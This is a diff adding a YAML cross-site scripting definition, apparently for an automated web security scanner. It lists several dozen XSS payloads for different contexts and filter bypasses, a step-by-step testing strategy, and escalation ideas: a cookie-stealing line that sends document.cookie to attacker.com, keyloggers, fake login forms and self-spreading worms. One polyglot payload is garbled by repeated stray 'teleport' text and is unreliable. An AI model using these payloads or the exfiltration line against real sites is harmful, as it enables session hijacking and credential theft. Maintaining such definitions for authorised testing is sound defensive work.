@@ -1,0 +1,79 @@
+id: XSS
+name: Cross-Site Scripting
+cwe:
+- CWE-79
+owasp: A03:2021 Injection
+severity_range: Medium - High
+description: User input is reflected or stored in HTML output without proper encoding, allowing execution of arbitrary JavaScript
+  in victims' browsers.
+detection:
+  payloads:
+    reflected_basic:
+    - <script>alert(1)</script>
+    - <img src=x onerror=alert(1)>
+    - <svg onload=alert(1)>
+    - '"><script>alert(1)</script>'
+    - '''-alert(1)-'''
+    - <body onload=alert(1)>
+    - <input onfocus=alert(1) autofocus>
+    - <marquee onstart=alert(1)>
+    - <details open ontoggle=alert(1)>
+    - <video src=x onerror=alert(1)>
+    attribute_context:
+    - '" onfocus=alert(1) autofocus="'
+    - ''' onfocus=alert(1) autofocus='''
+    - '" onmouseover=alert(1) "'
+    - javascript:alert(1)
+    - '" style="background:url(javascript:alert(1))"'
+    javascript_context:
+    - ''';alert(1)//'
+    - '";alert(1)//'
+    - \';alert(1)//
+    - </script><script>alert(1)</script>
+    - '''-alert(1)-'''
+    - \x3cscript\x3ealert(1)\x3c/script\x3e
+    dom_based:
+    - '#<img src=x onerror=alert(1)>'
+    - javascript:alert(document.domain)
+    - data:text/html,<script>alert(1)</script>
+    polyglot:
+    - jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%%0teleport0teleport%0teleport%0a%0d%0aon*/teleport/<svg/onload=alert()//
+    - '"><img src=x onerror=alert(1)>'
+    - '''-alert(1)-'''
+    filter_bypass:
+    - <scr<script>ipt>alert(1)</scr</script>ipt>
+    - <ScRiPt>alert(1)</ScRiPt>
+    - <img src=x oNeRrOr=alert(1)>
+    - <svg/onload=alert(1)>
+    - <img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
+    - \u003cscript\u003ealert(1)\u003c/script\u003e
+  strategy:
+  - 1. Inject a unique canary string (e.g., mantis12345) in every input
+  - 2. Search the response for the canary to find reflection points
+  - '3. Determine the context: HTML body, attribute, JavaScript, URL, CSS'
+  - 4. Craft context-appropriate payloads
+  - 5. Test for DOM-based XSS by checking client-side JavaScript sinks
+  - 6. Test stored XSS by submitting payloads and checking other pages
+  - 7. Check for CSP headers and test bypasses if present
+  - 8. Test HTTP response headers for header injection leading to XSS
+escalation:
+  session_hijacking: 'Use XSS to steal session cookies: new Image().src=''http://attacker.com/?c=''+document.cookie'
+  keylogging: Inject a keylogger to capture credentials on login pages
+  phishing: Replace page content with a fake login form
+  csrf_via_xss: Use XSS to perform authenticated actions on behalf of the victim
+  worm: Self-propagating XSS worm via stored XSS in social features
+evidence_needed: Payload reflected/stored in response and executable in browser context. Screenshot or DOM evidence showing
+  script execution.
+ai_research_hints:
+- Analyze the application's sanitization library and find bypass vectors
+- Check for mutation XSS (mXSS) via innerHTML or DOMParser
+- Test postMessage handlers for DOM-based XSS
+- Check template engines for client-side template injection (AngularJS, Vue.js)
+- Look for JSONP endpoints that can be used for XSS
+- Test SVG upload for stored XSS via SVG files
+references:
+- https://portswigger.net/web-security/cross-site-scripting
+- https://owasp.org/www-community/attacks/xss/
+- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+- https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
+- https://html5sec.org/
